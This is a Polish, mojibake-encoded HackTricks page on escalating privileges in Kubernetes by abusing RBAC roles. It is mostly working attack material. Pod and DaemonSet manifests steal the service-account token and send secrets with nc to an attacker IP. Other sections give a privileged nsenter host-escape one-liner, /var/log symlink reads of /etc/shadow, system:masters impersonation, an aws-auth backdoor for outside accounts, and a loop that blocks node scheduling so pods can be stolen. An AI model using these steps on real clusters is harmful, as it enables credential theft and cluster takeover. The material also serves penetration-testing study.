# NaduÅ¼ywanie rÃ³l/ClusterRoles w Kubernetes

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Tutaj znajdziesz kilka potencjalnie niebezpiecznych konfiguracji rÃ³l i ClusterRoles.\
PamiÄ™taj, Å¼e moÅ¼esz uzyskaÄ‡ wszystkie obsÅ‚ugiwane zasoby za pomocÄ… `kubectl api-resources`

## **Eskalacja uprawnieÅ„**

MÃ³wiÄ…c o zdolnoÅ›ci **uzyskania dostÄ™pu do innego podmiotu** w klastrze **z innymi uprawnieniami** (wewnÄ…trz klastra Kubernetes lub do zewnÄ™trznych chmur), w Kubernetes istniejÄ… gÅ‚Ã³wnie **4 podstawowe techniki eskalacji uprawnieÅ„**:

* ByÄ‡ w stanie **podawaÄ‡ siÄ™ za** inne uÅ¼ytkownika/grupy/SA z lepszymi uprawnieniami wewnÄ…trz klastra Kubernetes lub do zewnÄ™trznych chmur
* ByÄ‡ w stanie **tworzyÄ‡/aktualizowaÄ‡/wykonujÄ…Ä‡ pody**, gdzie moÅ¼na **znaleÅºÄ‡ lub doÅ‚Ä…czyÄ‡ SA** z lepszymi uprawnieniami wewnÄ…trz klastra Kubernetes lub do zewnÄ™trznych chmur
* ByÄ‡ w stanie **odczytywaÄ‡ sekrety**, poniewaÅ¼ tokeny SA sÄ… przechowywane jako sekrety
* ByÄ‡ w stanie **uciec do wÄ™zÅ‚a** z kontenera, gdzie moÅ¼na ukraÅ›Ä‡ wszystkie sekrety kontenerÃ³w dziaÅ‚ajÄ…cych na wÄ™Åºle, poÅ›wiadczenia wÄ™zÅ‚a i uprawnienia wÄ™zÅ‚a w chmurze, w ktÃ³rej dziaÅ‚a (jeÅ›li istniejÄ…)
* PiÄ…ta technika, ktÃ³ra zasÅ‚uguje na uwagÄ™, to moÅ¼liwoÅ›Ä‡ **uruchomienia port-forward** w podzie, poniewaÅ¼ moÅ¼na uzyskaÄ‡ dostÄ™p do interesujÄ…cych zasobÃ³w w tym podzie.

### DostÄ™p do Dowolnego Zasobu lub Czasownika (Znak wieloznaczny)

**Znak wieloznaczny (\*) nadaje uprawnienia do dowolnego zasobu z dowolnym czasownikiem**. Jest uÅ¼ywany przez administratorÃ³w. WewnÄ…trz ClusterRole oznacza to, Å¼e atakujÄ…cy mÃ³gÅ‚by naduÅ¼yÄ‡ dowolnego namespace w klastrze
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### DostÄ™p do dowolnego zasobu z okreÅ›lonym czasownikiem

W RBAC pewne uprawnienia stwarzajÄ… znaczne ryzyko:

1. **`create`:** Udziela moÅ¼liwoÅ›ci tworzenia dowolnego zasobu klastra, zwiÄ™kszajÄ…c ryzyko eskalacji uprawnieÅ„.
2. **`list`:** UmoÅ¼liwia wyÅ›wietlanie wszystkich zasobÃ³w, potencjalnie ujawniajÄ…c wraÅ¼liwe dane.
3. **`get`:** Pozwala na dostÄ™p do tajnych informacji z kont usÅ‚ug, stanowiÄ…c zagroÅ¼enie dla bezpieczeÅ„stwa.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Tworzenie Pod - KradzieÅ¼ Tokena

AtakujÄ…cy posiadajÄ…cy uprawnienia do tworzenia poda, mÃ³gÅ‚by doÅ‚Ä…czyÄ‡ uprzywilejowane konto usÅ‚ugi do poda i ukraÅ›Ä‡ token, aby podszywaÄ‡ siÄ™ pod to konto usÅ‚ugi. Efektywnie eskalujÄ…c uprawnienia do niego.

PrzykÅ‚ad poda, ktÃ³ry ukradnie token konta usÅ‚ugi `bootstrap-signer` i wyÅ›le go do atakujÄ…cego:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Tworzenie i Ucieczka z Podu

PoniÅ¼sze wskazuje wszystkie uprawnienia, jakie moÅ¼e mieÄ‡ kontener:

* **DostÄ™p uprzywilejowany** (wyÅ‚Ä…czenie zabezpieczeÅ„ i ustawienie moÅ¼liwoÅ›ci)
* **WyÅ‚Ä…czenie przestrzeni nazw hostIPC i hostPid**, ktÃ³re mogÄ… pomÃ³c w eskalacji uprawnieÅ„
* **WyÅ‚Ä…czenie przestrzeni nazw hostNetwork**, umoÅ¼liwiajÄ…ce dostÄ™p do kradzieÅ¼y uprawnieÅ„ chmury wÄ™zÅ‚Ã³w i lepszy dostÄ™p do sieci
* **Zamontowanie hostÃ³w / wewnÄ…trz kontenera**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

UtwÃ³rz pod z:
```bash
kubectl --token $token create -f mount_root.yaml
```
Jednolinijkowiec z [tego tweeta](https://twitter.com/mauilion/status/1129468485480751104) i z kilkoma dodatkami:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Teraz, gdy moÅ¼esz uciec do wÄ™zÅ‚a, sprawdÅº techniki post-eksploatacji w:

#### Ukrycie

Prawdopodobnie chcesz byÄ‡ **bardziej skryty**, na nastÄ™pnych stronach moÅ¼esz zobaczyÄ‡, do czego mÃ³gÅ‚byÅ› uzyskaÄ‡ dostÄ™p, tworzÄ…c pod tylko aktywujÄ…c niektÃ³re z wymienionych uprawnieÅ„ w poprzednim szablonie:

* **Uprawnienia + hostPID**
* **Tylko uprawnienia**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_PrzykÅ‚ady tworzenia/ naduÅ¼ywania poprzednich konfiguracji uprzywilejowanych podÃ³w moÅ¼na znaleÅºÄ‡ w_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Tworzenie Poda - PrzejÅ›cie do chmury

JeÅ›li moÅ¼esz **utworzyÄ‡** **pod** (i opcjonalnie **konto usÅ‚ugi**), moÅ¼esz **uzyskaÄ‡ uprawnienia w Å›rodowisku chmurowym**, przypisujÄ…c uprawnienia chmurowe do poda lub konta usÅ‚ugi, a nastÄ™pnie uzyskujÄ…c do nich dostÄ™p.\
Co wiÄ™cej, jeÅ›li moÅ¼esz utworzyÄ‡ **pod z przestrzeniÄ… nazw sieci hosta**, moÅ¼esz **ukraÅ›Ä‡ rolÄ™ IAM** instancji **wÄ™zÅ‚a**.

Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **UtwÃ³rz/ZmieÅ„ wdroÅ¼enie, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs i Cronjobs**

MoÅ¼liwe jest naduÅ¼ycie tych uprawnieÅ„ do **utworzenia nowego poda** i uzyskania uprawnieÅ„, jak w poprzednim przykÅ‚adzie.

PoniÅ¼szy plik yaml **tworzy daemonset i wycieka token SA** wewnÄ…trz poda:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Wykonanie poleceÅ„ w kontenerze**

**`pods/exec`** to zasÃ³b w kubernetes uÅ¼ywany do **wykonywania poleceÅ„ w powÅ‚oce wewnÄ…trz poda**. Pozwala to **wykonywaÄ‡ polecenia w kontenerach lub uzyskaÄ‡ dostÄ™p do powÅ‚oki**.

Dlatego moÅ¼liwe jest **wejÅ›cie do poda i kradzieÅ¼ tokenu SA**, lub wejÅ›cie do uprzywilejowanego poda, ucieczka do wÄ™zÅ‚a i kradzieÅ¼ wszystkich tokenÃ³w podÃ³w na wÄ™Åºle oraz (naduÅ¼ycie) wÄ™zeÅ‚:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

To uprawnienie pozwala na **przekierowanie jednego lokalnego portu do jednego portu w okreÅ›lonym podzie**. Ma to uÅ‚atwiÄ‡ debugowanie aplikacji dziaÅ‚ajÄ…cych wewnÄ…trz poda, ale atakujÄ…cy moÅ¼e naduÅ¼yÄ‡ go, aby uzyskaÄ‡ dostÄ™p do interesujÄ…cych (jak bazy danych) lub podatnych aplikacji (strony internetowe?) wewnÄ…trz poda:
```
kubectl port-forward pod/mypod 5000:5000
```
### Ucieczka z zapisywalnego hosta /var/log/

Jak [**wskazano w tej analizie**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), jeÅ›li masz dostÄ™p lub moÅ¼esz utworzyÄ‡ pod z **zamontowanym katalogiem hostÃ³w `/var/log/`**, moÅ¼esz **uciec z kontenera**.\
To wynika z faktu, Å¼e gdy **Kube-API prÃ³buje pobraÄ‡ logi** kontenera (uÅ¼ywajÄ…c `kubectl logs <pod>`), Å¼Ä…da pliku `0.log` poda za pomocÄ… punktu koÅ„cowego `/logs/` usÅ‚ugi **Kubelet**.\
UsÅ‚uga Kubelet udostÄ™pnia punkt koÅ„cowy `/logs/`, ktÃ³ry w zasadzie **eksponuje system plikÃ³w `/var/log` kontenera**.

Dlatego atakujÄ…cy majÄ…cy **dostÄ™p do zapisu w katalogu /var/log/** kontenera mÃ³gÅ‚by naduÅ¼yÄ‡ tego zachowania na 2 sposoby:

* Modyfikacja pliku `0.log` swojego kontenera (zazwyczaj znajdujÄ…cego siÄ™ w `/var/logs/pods/namespace_pod_uid/container/0.log`) tak, aby byÅ‚ **symlinkiem wskazujÄ…cym na `/etc/shadow`** na przykÅ‚ad. NastÄ™pnie bÄ™dziesz mÃ³gÅ‚ wydobyÄ‡ plik cieni hostÃ³w wykonujÄ…c:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* JeÅ›li atakujÄ…cy kontroluje jakÄ…kolwiek podmiot z uprawnieniami do odczytu `nodes/log`, moÅ¼e po prostu utworzyÄ‡ **symlink** w `/host-mounted/var/log/sym` do `/`, a nastÄ™pnie podczas **dostÄ™pu do `https://<gateway>:10250/logs/sym/` wyÅ›wietli system plikÃ³w roota hosta** (zmiana symlinka moÅ¼e umoÅ¼liwiÄ‡ dostÄ™p do plikÃ³w).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Laboratorium i zautomatyzowany exploit moÅ¼na znaleÅºÄ‡ pod adresem** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### OminiÄ™cie ochrony readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

JeÅ›li masz szczÄ™Å›cie i bardzo uprzywilejowana zdolnoÅ›Ä‡ `CAP_SYS_ADMIN` jest dostÄ™pna, moÅ¼esz po prostu ponownie zamontowaÄ‡ folder jako rw:
```bash
mount -o rw,remount /hostlogs/
```
#### OminiÄ™cie ochrony hostPath readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Jak stwierdzono w [**tej analizie**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), moÅ¼liwe jest ominiecie ochrony:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
KtÃ³ry miaÅ‚ zapobiec ucieczkom takim jak poprzednie, zamiast korzystaÄ‡ z montowania hostPath, uÅ¼ywa PersistentVolume i PersistentVolumeClaim do zamontowania folderu hosta w kontenerze z dostÄ™pem do zapisu:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Podszywanie siÄ™ pod uprzywilejowane konta**

Z uprawnieniami [**podszycia siÄ™ pod uÅ¼ytkownika**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), atakujÄ…cy mÃ³gÅ‚by podszyÄ‡ siÄ™ pod uprzywilejowane konto.

Wystarczy uÅ¼yÄ‡ parametru `--as=<nazwa_uÅ¼ytkownika>` w poleceniu `kubectl`, aby podszyÄ‡ siÄ™ pod uÅ¼ytkownika, lub `--as-group=<grupa>` aby podszyÄ‡ siÄ™ pod grupÄ™:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Albo skorzystaj z interfejsu REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### WyÅ›wietlanie SekretÃ³w

Uprawnienie do **wyÅ›wietlania sekretÃ³w moÅ¼e umoÅ¼liwiÄ‡ atakujÄ…cemu faktyczne odczytanie sekretÃ³w** poprzez dostÄ™p do punktu koÅ„cowego interfejsu API REST:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Odczytywanie tajemnicy â€“ prÃ³ba odgadniÄ™cia identyfikatorÃ³w tokenÃ³w

Podczas gdy atakujÄ…cy posiadajÄ…cy token z uprawnieniami do odczytu wymaga dokÅ‚adnej nazwy tajemnicy, aby jej uÅ¼yÄ‡, w przeciwieÅ„stwie do szerszego uprawnienia _**listowania tajemnic**_, istniejÄ… nadal podatnoÅ›ci. DomyÅ›lne konta usÅ‚ug w systemie mogÄ… byÄ‡ wyliczone, zwiÄ…zane z kaÅ¼dÄ… tajemnicÄ…. Te tajemnice majÄ… strukturÄ™ nazwy: statyczny prefiks, a nastÄ™pnie losowy piÄ™ciocyfrowy alfanumeryczny token (z wyÅ‚Ä…czeniem pewnych znakÃ³w) zgodnie z [kodem ÅºrÃ³dÅ‚owym](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Token jest generowany z ograniczonego zestawu 27 znakÃ³w (`bcdfghjklmnpqrstvwxz2456789`), zamiast peÅ‚nego zakresu alfanumerycznego. To ograniczenie zmniejsza Å‚Ä…cznÄ… liczbÄ™ moÅ¼liwych kombinacji do 14 348 907 (27^5). W rezultacie atakujÄ…cy mogliby wykonaÄ‡ atak brute-force w celu odgadniÄ™cia tokenu w ciÄ…gu kilku godzin, co potencjalnie prowadziÅ‚oby do eskalacji uprawnieÅ„ poprzez uzyskanie dostÄ™pu do poufnych kont usÅ‚ug.

### Wnioski o podpisywaniu certyfikatÃ³w

JeÅ›li masz czasowniki **`create`** w zasobie `certificatesigningrequests` (lub przynajmniej w `certificatesigningrequests/nodeClient`). MoÅ¼esz **utworzyÄ‡** nowy CeSR dla **nowego wÄ™zÅ‚a**.

Zgodnie z [dokumentacjÄ… moÅ¼liwe jest automatyczne zatwierdzanie tych wnioskÃ³w](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), wiÄ™c w tym przypadku **nie potrzebujesz dodatkowych uprawnieÅ„**. W przeciwnym razie musiaÅ‚byÅ› mÃ³c zatwierdziÄ‡ wniosek, co oznacza aktualizacjÄ™ w `certificatesigningrequests/approval` i `approve` w `signers` z resourceName `<signerNameDomain>/<signerNamePath>` lub `<signerNameDomain>/*`

**PrzykÅ‚ad roli** z wszystkimi wymaganymi uprawnieniami to:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
WiÄ™c, po zatwierdzeniu nowego CSR wÄ™zÅ‚a, moÅ¼esz **naduÅ¼yÄ‡** specjalnych uprawnieÅ„ wÄ™zÅ‚Ã³w, aby **ukraÅ›Ä‡ sekrety** i **eskalowaÄ‡ uprawnienia**.

W [**tym poÅ›cie**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) i [**tym**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) konfiguracja GKE K8s TLS Bootstrap jest skonfigurowana z **automatycznym podpisywaniem** i jest naduÅ¼ywana do generowania poÅ›wiadczeÅ„ nowego wÄ™zÅ‚a K8s, a nastÄ™pnie naduÅ¼ywana do eskalacji uprawnieÅ„ poprzez kradzieÅ¼ sekretÃ³w. JeÅ›li **masz wspomniane uprawnienia, moÅ¼esz zrobiÄ‡ to samo**. ZauwaÅ¼, Å¼e pierwszy przykÅ‚ad omija bÅ‚Ä…d uniemoÅ¼liwiajÄ…cy nowemu wÄ™zÅ‚owi dostÄ™p do sekretÃ³w wewnÄ…trz kontenerÃ³w, poniewaÅ¼ **wÄ™zeÅ‚ moÅ¼e uzyskaÄ‡ dostÄ™p tylko do sekretÃ³w kontenerÃ³w zamontowanych na nim**.

SposÃ³b obejÅ›cia to po prostu **utworzenie poÅ›wiadczeÅ„ wÄ™zÅ‚a dla nazwy wÄ™zÅ‚a, na ktÃ³rym zamontowany jest kontener z interesujÄ…cymi sekretami** (ale sprawdÅº, jak to zrobiÄ‡ w pierwszym poÅ›cie):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### Konfiguracje aws-auth AWS EKS

Podmioty, ktÃ³re mogÄ… modyfikowaÄ‡ **`configmaps`** w przestrzeni nazw kube-system na klastrach EKS (muszÄ… znajdowaÄ‡ siÄ™ w AWS), mogÄ… uzyskaÄ‡ uprawnienia administratora klastra, nadpisujÄ…c konfiguracjÄ™ **aws-auth**.\
Potrzebne sÄ… czasowniki **`update`** i **`patch`**, lub **`create`** jeÅ›li konfiguracja configmap nie zostaÅ‚a jeszcze utworzona:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
MoÅ¼esz uÅ¼yÄ‡ **`aws-auth`** do **trwaÅ‚ego dostÄ™pu** dla uÅ¼ytkownikÃ³w z **innych kont**.

Jednak `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **nie dziaÅ‚a z innego konta**. Ale faktycznie `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` dziaÅ‚a, jeÅ›li podasz ARN klastra zamiast samej nazwy.\
Aby `kubectl` dziaÅ‚aÅ‚, upewnij siÄ™, Å¼e **skonfigurowano kubeconfig ofiary** i w argumentach exec aws dodaj `--profile other_account_role`, aby kubectl uÅ¼ywaÅ‚ profilu innego konta do uzyskania tokena i kontaktowania siÄ™ z AWS.
{% endhint %}

### Eskalacja w GKE

IstniejÄ… **2 sposoby przypisywania uprawnieÅ„ K8s do podmiotÃ³w GCP**. W kaÅ¼dym przypadku podmiot musi rÃ³wnieÅ¼ mieÄ‡ uprawnienie **`container.clusters.get`**, aby mÃ³c zbieraÄ‡ poÅ›wiadczenia dostÄ™pu do klastra, lub bÄ™dziesz musiaÅ‚ **wygenerowaÄ‡ wÅ‚asny plik konfiguracyjny kubectl** (postÄ™puj zgodnie z nastÄ™pnym odnoÅ›nikiem).

{% hint style="warning" %}
Podczas rozmowy z punktem koÅ„cowym interfejsu API K8s, zostanie wysÅ‚any **token uwierzytelniajÄ…cy GCP**. NastÄ™pnie GCP, poprzez interfejs API K8s, najpierw **sprawdzi, czy podmiot** (za pomocÄ… adresu e-mail) **ma jakikolwiek dostÄ™p wewnÄ…trz klastra**, a nastÄ™pnie sprawdzi, czy ma **jakikolwiek dostÄ™p za poÅ›rednictwem GCP IAM**.\
JeÅ›li **ktÃ³rekolwiek** z nich jest **prawdziwe**, zostanie udzielona **odpowiedÅº**. JeÅ›li **nie**, zostanie podana **informacja o bÅ‚Ä™dzie**, sugerujÄ…ca udzielenie **uprawnieÅ„ za poÅ›rednictwem GCP IAM**.
{% endhint %}

NastÄ™pnie, pierwsza metoda polega na uÅ¼yciu **GCP IAM**, uprawnienia K8s majÄ… swoje **odpowiednie uprawnienia GCP IAM**, i jeÅ›li podmiot je posiada, bÄ™dzie mÃ³gÅ‚ ich uÅ¼yÄ‡.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Drugi sposÃ³b polega na **przypisaniu uprawnieÅ„ K8s wewnÄ…trz klastra** do identyfikacji uÅ¼ytkownika za pomocÄ… jego **adresu e-mail** (w tym konta usÅ‚ugowe GCP).

### UtwÃ³rz tokeny kont usÅ‚ugowych

Podmioty, ktÃ³re mogÄ… **tworzyÄ‡ Å¼Ä…dania tokenÃ³w** (`serviceaccounts/token`) Podczas rozmowy z punktem koÅ„cowym interfejsu API K8s SAs (informacje z [**tutaj**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Podmioty, ktÃ³re mogÄ… **`aktualizowaÄ‡`** lub **`poprawiaÄ‡`** **`pods/ephemeralcontainers`** mogÄ… uzyskaÄ‡ **wykonanie kodu na innych podach**, a potencjalnie **wydostaÄ‡ siÄ™** do ich wÄ™zÅ‚a, dodajÄ…c kontener tymczasowy z uprzywilejowanym securityContext

### ValidatingWebhookConfigurations lub MutatingWebhookConfigurations

Podmioty z dowolnymi czasownikami `create`, `update` lub `patch` nad `validatingwebhookconfigurations` lub `mutatingwebhookconfigurations` mogÄ… **utworzyÄ‡ jednÄ… z takich webhookconfigurations**, aby mÃ³c **eskalowaÄ‡ uprawnienia**.

Dla przykÅ‚adu [`mutatingwebhookconfigurations` sprawdÅº tÄ™ sekcjÄ™ tego posta](./#malicious-admission-controller).

### Eskalacja

Jak moÅ¼na przeczytaÄ‡ w nastÄ™pnej sekcji: [**Zapobieganie wbudowanej eskalacji uprawnieÅ„**](./#built-in-privileged-escalation-prevention), podmiot nie moÅ¼e aktualizowaÄ‡ ani tworzyÄ‡ rÃ³l ani clusterroles bez posiadania tych nowych uprawnieÅ„. Z wyjÄ…tkiem, gdy ma **czasownik `escalate`** nad **`roles`** lub **`clusterroles`.**\
Wtedy moÅ¼e aktualizowaÄ‡/tworzyÄ‡ nowe role, clusterroles z lepszymi uprawnieniami niÅ¼ te, ktÃ³re posiada.

### Proxy wÄ™zÅ‚Ã³w

Podmioty majÄ…ce dostÄ™p do podzasobu **`nodes/proxy`** mogÄ… **wykonywaÄ‡ kod na podach** za poÅ›rednictwem interfejsu API Kubelet (zgodnie z [**tutaj**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). WiÄ™cej informacji na temat uwierzytelniania Kubelet znajdziesz na tej stronie:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Masz przykÅ‚ad, jak uzyskaÄ‡ [**RCE rozmawiajÄ…c z autoryzowanym interfejsem API Kubelet tutaj**](../pentesting-kubernetes-services/#kubelet-rce).

### UsuÅ„ podsy + wÄ™zÅ‚y nieskalowalne

Podmioty, ktÃ³re mogÄ… **usunÄ…Ä‡ podsy** (czasownik `delete` nad zasobem `pods`), lub **wymusiÄ‡ usuniÄ™cie podÃ³w** (czasownik `create` nad zasobem `pods/eviction`), lub **zmieniÄ‡ status poda** (dostÄ™p do `pods/status`) i mogÄ… **uniemoÅ¼liwiÄ‡ skalowanie innych wÄ™zÅ‚Ã³w** (dostÄ™p do `nodes/status`) lub **usunÄ…Ä‡ wÄ™zÅ‚y** (czasownik `delete` nad zasobem `nodes`) i majÄ… kontrolÄ™ nad podem, mogÄ… **ukraÅ›Ä‡ pody z innych wÄ™zÅ‚Ã³w**, aby byÅ‚y **wykonywane** na **skompromitowanym** **wÄ™Åºle**, a atakujÄ…cy moÅ¼e **ukraÅ›Ä‡ tokeny** z tych podÃ³w.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

